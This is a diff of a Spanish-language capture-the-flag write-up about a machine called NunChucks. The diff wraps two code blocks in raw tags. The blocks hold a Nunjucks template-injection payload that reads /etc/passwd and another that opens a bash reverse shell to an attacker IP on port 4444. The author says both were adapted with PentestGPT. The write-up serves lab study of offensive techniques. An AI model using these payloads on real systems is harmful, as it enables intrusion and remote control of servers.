@@ -208,17 +208,21 @@ Al estar corriendo `node.js`, he buscado en `hacktricks` y he dado con el templa
 
 He probado los `payloads` de la página de `hacktricks` sin embargo, `no funcionan` correctamente debido a que le estamos mandando el `payload` en un `json` y las `comillas` dan `conflictos`, por lo tanto he usado `PentestGPT` para obtener un payload `alternativo` para poder leer el `/etc/passwd`
 
+{% raw %}
 ```
 {{ range.constructor('return global.process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\", \"utf8\")')() }}
 ```
+{% endraw %}
 
 ![](/assets/img/NunChucks/image_15.png)
 
 Ahora vamos a establecernos unas `reverse shell` a nuestro equipo, le he pedido a `PentestGPT` que me `adapte` el `payload` para establecerme una `reverse shell` que se encuentra en la página de `hacktricks`
 
+{% raw %}
 ```
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.16.15/4444 0>&1\\\"')\")()}}
 ```
+{% endraw %}
 
 ![](/assets/img/NunChucks/image_16.png)
 
